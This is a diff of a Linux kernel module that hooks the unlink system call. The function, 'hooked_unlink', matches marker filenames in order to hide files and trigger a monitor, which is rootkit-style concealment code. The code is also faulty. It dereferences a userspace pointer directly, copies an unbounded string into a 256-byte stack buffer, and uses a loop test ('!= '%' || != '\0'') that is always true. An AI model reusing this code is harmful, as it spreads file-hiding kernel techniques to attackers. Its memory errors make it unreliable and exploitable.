@@ -141,10 +141,9 @@ asmlinkage long hooked_unlink(const char __user *filename){
     char *tmp;
     char value[256];
     
-    memcpy(value, filename, strlen(filename) + 1);
-    printk("[hide %s]\n", value);
     //Hide a new type of file
-    if(strncmp(value, INEXISTFILE, strlen(INEXISTFILE)) == 0){
+    if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
+        memcpy(value, filename, strlen(filename) + 1);
         tmp = value;
         printk("hide %s\n", tmp);
         while(*tmp != '%' || *tmp != '\0') tmp++;
@@ -153,14 +152,13 @@ asmlinkage long hooked_unlink(const char __user *filename){
             filenum++;
         }
         printk("hide %s\n", tmp);
-        return 0;
-    } else if(strncmp(value, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
+    } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
+        memcpy(value, filename, strlen(filename) + 1);
         tmp = value;
         while(*tmp != '%' || *tmp != '\0') tmp++;
         if(*tmp == '%'){
             monitor = tmp;
         }
-        return 0;
     }
     if(monitor != NULL){
         callMonitor(value);
